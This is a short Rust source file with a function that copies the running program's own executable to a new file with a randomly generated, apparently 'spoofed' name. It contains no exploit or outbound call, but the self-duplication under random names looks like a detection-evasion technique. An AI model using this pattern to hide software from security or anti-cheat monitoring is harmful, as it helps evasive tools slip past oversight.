use crate::utils;
use std::env;
use std::fs::File;
use std::io::{self, Read, Write};
use std::path::PathBuf;

use crate::constants::SPOOFED_EXECUTABLE_LENGTH;

pub fn try_duplicate_itself() -> io::Result<(PathBuf, PathBuf)> {
    let current_exe_path = env::current_exe()?;
    let mut file = File::open(&current_exe_path)?;
    let mut buffer: Vec<u8> = Vec::new();

    file.read_to_end(&mut buffer)?;

    let new_exe_name = utils::generate_random_executable_name(SPOOFED_EXECUTABLE_LENGTH);
    let new_exe_path = current_exe_path.with_file_name(new_exe_name);
    let mut new_exe_file = File::create(&new_exe_path)?;

    new_exe_file.write_all(&buffer)?;

    Ok((current_exe_path, new_exe_path))
}
